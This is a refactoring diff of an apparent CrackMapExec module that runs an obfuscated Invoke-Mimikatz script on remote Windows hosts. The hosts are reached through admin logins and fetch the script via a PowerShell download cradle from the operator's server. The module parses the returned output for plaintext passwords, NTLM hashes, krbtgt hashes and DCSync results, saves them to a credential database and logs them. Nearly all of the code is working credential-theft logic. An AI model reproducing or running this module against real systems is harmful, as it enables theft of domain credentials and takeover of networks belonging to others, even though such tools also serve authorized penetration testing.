@@ -28,14 +28,14 @@ class CMEModule:
         self.ps_script = obfs_ps_script('powersploit/Exfiltration/Invoke-Mimikatz.ps1')
 
     def on_admin_login(self, context, connection):
-        command = "Invoke-Mimikatz -Command '{}'".format(self.command)
+        command = f"Invoke-Mimikatz -Command '{self.command}'"
         launcher = gen_ps_iex_cradle(context, 'Invoke-Mimikatz.ps1', command)
 
         connection.ps_execute(launcher)
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
-        if 'Invoke-Mimikatz.ps1' == request.path[1:]:
+        if request.path[1:] == 'Invoke-Mimikatz.ps1':
             request.send_response(200)
             request.end_headers()
             request.wfile.write(self.ps_script.encode())
@@ -52,7 +52,12 @@ class CMEModule:
         Stolen from the Empire project.
         """
         seen = set()
-        return [item for item in tuples if "{}{}{}{}".format(item[0],item[1],item[2],item[3]) not in seen and not seen.add("{}{}{}{}".format(item[0],item[1],item[2],item[3]))]
+        return [
+            item
+            for item in tuples
+            if f"{item[0]}{item[1]}{item[2]}{item[3]}" not in seen
+            and not seen.add(f"{item[0]}{item[1]}{item[2]}{item[3]}")
+        ]
 
     def parse_mimikatz(self, data):
         """
@@ -72,7 +77,7 @@ class CMEModule:
         domainSid = ""
         hostName = ""
         lines = data.split("\n")
-        for line in lines[0:2]:
+        for line in lines[:2]:
             if line.startswith("Hostname:"):
                 try:
                     domain = line.split(":")[1].strip()
@@ -113,17 +118,12 @@ class CMEModule:
                         domain = hostDomain
                         sid = domainSid
 
-                    if validate_ntlm(password):
-                        credType = "hash"
-
-                    else:
-                        credType = "plaintext"
-
+                    credType = "hash" if validate_ntlm(password) else "plaintext"
                     # ignore machine account plaintexts
                     if not (credType == "plaintext" and username.endswith("$")):
                         creds.append((credType, domain, username, password, hostName, sid))
 
-        if len(creds) == 0:
+        if not creds:
             # check if we have lsadump output to check for krbtgt
             #   happens on domain controller hashdumps
             for x in range(8,13):
@@ -141,7 +141,7 @@ class CMEModule:
                             domain = hostDomain
                             sid = domainSid
 
-                        for x in range(0, len(lines)):
+                        for x in range(len(lines)):
                             if lines[x].startswith("User : krbtgt"):
                                 krbtgtHash = lines[x+2].split(":")[1].strip()
                                 break
@@ -151,28 +151,26 @@ class CMEModule:
                     except Exception as e:
                         pass
 
-        if len(creds) == 0:
-            # check if we get lsadump::dcsync output
-            if '** SAM ACCOUNT **' in lines:
-                domain, user, userHash, dcName, sid = "", "", "", "", ""
-                for line in lines:
-                    try:
-                        if line.strip().endswith("will be the domain"):
-                            domain = line.split("'")[1]
-                        elif line.strip().endswith("will be the DC server"):
-                            dcName = line.split("'")[1].split(".")[0]
-                        elif line.strip().startswith("SAM Username"):
-                            user = line.split(":")[1].strip()
-                        elif line.strip().startswith("Object Security ID"):
-                            parts = line.split(":")[1].strip().split("-")
-                            sid = "-".join(parts[0:-1])
-                        elif line.strip().startswith("Hash NTLM:"):
-                            userHash = line.split(":")[1].strip()
-                    except:
-                        pass
+        if not creds and '** SAM ACCOUNT **' in lines:
+            domain, user, userHash, dcName, sid = "", "", "", "", ""
+            for line in lines:
+                try:
+                    if line.strip().endswith("will be the domain"):
+                        domain = line.split("'")[1]
+                    elif line.strip().endswith("will be the DC server"):
+                        dcName = line.split("'")[1].split(".")[0]
+                    elif line.strip().startswith("SAM Username"):
+                        user = line.split(":")[1].strip()
+                    elif line.strip().startswith("Object Security ID"):
+                        parts = line.split(":")[1].strip().split("-")
+                        sid = "-".join(parts[:-1])
+                    elif line.strip().startswith("Hash NTLM:"):
+                        userHash = line.split(":")[1].strip()
+                except:
+                    pass
 
-                if domain != "" and userHash != "":
-                    creds.append(("hash", domain, user, userHash, dcName, sid))
+            if domain != "" and userHash != "":
+                creds.append(("hash", domain, user, userHash, dcName, sid))
 
         return self.uniquify_tuples(creds)
 
@@ -194,12 +192,16 @@ class CMEModule:
                         # Get the hostid from the DB
                         hostid = context.db.get_computers(response.client_address[0])[0][0]
                         context.db.add_credential(credtype, domain, username, password, pillaged_from=hostid)
-                        context.log.highlight('{}\\{}:{}'.format(domain, username, password))
+                        context.log.highlight(f'{domain}\\{username}:{password}')
 
-                    context.log.success("Added {} credential(s) to the database".format(highlight(len(creds))))
+                    context.log.success(
+                        f"Added {highlight(len(creds))} credential(s) to the database"
+                    )
+
             else:
                 context.log.highlight(data)
 
-            log_name = 'Mimikatz-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
+            log_name = f'Mimikatz-{response.client_address[0]}-{datetime.now().strftime("%Y-%m-%d_%H%M%S")}.log'
+
             write_log(data, log_name)
-            context.log.info("Saved raw Mimikatz output to {}".format(log_name))
+            context.log.info(f"Saved raw Mimikatz output to {log_name}")
